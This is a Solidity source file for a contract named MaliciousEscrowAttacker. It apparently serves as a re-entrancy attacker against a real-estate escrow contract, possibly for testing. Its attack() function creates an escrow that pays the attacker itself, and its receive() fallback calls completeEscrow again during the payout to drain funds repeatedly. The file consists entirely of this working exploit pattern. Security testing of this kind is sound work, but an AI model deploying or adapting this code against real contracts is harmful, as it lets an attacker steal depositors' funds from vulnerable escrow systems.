// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IRealEstateEscrow {
    function createEscrow(uint256 _propertyId, address _payee, uint256 _amount) external payable;
    function completeEscrow(uint256 _escrowId) external;
}

contract MaliciousEscrowAttacker {
    address public escrowContract;
    uint256 public propertyId;
    uint256 public amount;

    constructor(address _escrowContract, uint256 _propertyId, uint256 _amount) {
        escrowContract = _escrowContract;
        propertyId = _propertyId;
        amount = _amount;
    }

    function attack() external payable {
        IRealEstateEscrow(escrowContract).createEscrow{value: amount}(
            propertyId,
            address(this),
            amount
        );
        IRealEstateEscrow(escrowContract).completeEscrow(1); // Re-entrancy
    }

    receive() external payable {
        // Trigger re-entrancy during withdrawal
        IRealEstateEscrow(escrowContract).completeEscrow(1);
    }
}
